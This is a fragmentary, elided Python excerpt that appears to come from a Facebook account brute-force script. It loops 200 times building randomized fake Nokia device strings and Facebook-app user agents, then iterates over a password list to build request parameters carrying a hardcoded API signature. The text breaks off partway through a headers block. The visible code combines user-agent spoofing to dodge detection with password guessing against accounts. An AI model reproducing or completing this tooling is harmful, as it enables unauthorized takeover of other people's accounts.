...
for z in range(200):
	...
	device = random.choice(["TA-1130 Build/NHG47L","TA-1111 Build/LMY47V","TA-1123 Build/N4F26T","TA-1127 Build/OPM5.171019.014","TA-1131 Build/OPR6.170623.023","TA-1132 Build/OPM5.171019.015","TA-1121 Build/MMB29K","TA-1141 Build/OPM6.171019.030.H1"])
	...
	ua = f"Mozilla/5.0 (Linux; Android {versi_android}; Nokia 1 Plus Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{versi_chrome} Mobile Safari/537.36[FBAN/EMA;FBLC/el_GR;FBAV/246.0.0.7.121.{str(random.randint(100000, 900000))};]"
		...
		try:
			for pw in pwx:
				...
				params = {
					...
					"sig": "afb3e4a6d8b868314cc843c21eebc6ae"
				}
				headers = {
